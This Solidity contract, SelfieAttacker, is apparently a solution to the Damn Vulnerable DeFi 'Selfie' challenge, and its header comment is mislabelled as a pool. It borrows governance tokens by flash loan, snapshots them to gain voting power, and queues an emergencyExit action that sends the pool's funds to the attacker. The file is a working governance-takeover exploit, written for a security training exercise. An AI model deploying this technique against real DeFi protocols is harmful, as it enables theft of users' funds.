// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @dev A simple pool to get flashloans of DVT
 */

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";

contract SelfieAttacker {
    SelfiePool private selfiePool;
    SimpleGovernance private simpleGovernance;
    DamnValuableTokenSnapshot token;
    address owner;

    constructor(address _selfiePool, address _simpleGovernance) {
        selfiePool = SelfiePool(_selfiePool);
        token = DamnValuableTokenSnapshot(address(selfiePool.token()));
        simpleGovernance = SimpleGovernance(_simpleGovernance);
        owner = msg.sender;
    }

    function attack(uint256 amount) public {
        selfiePool.flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            amount,
            "0x"
        );
    }

    function onFlashLoan(
        address,
        address,
        uint _amount,
        uint,
        bytes calldata
    ) external returns (bytes32) {
        require(msg.sender == address(selfiePool));
        token.snapshot();
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            owner
        );
        simpleGovernance.queueAction(address(selfiePool), 0, data);
        token.approve(address(selfiePool), _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
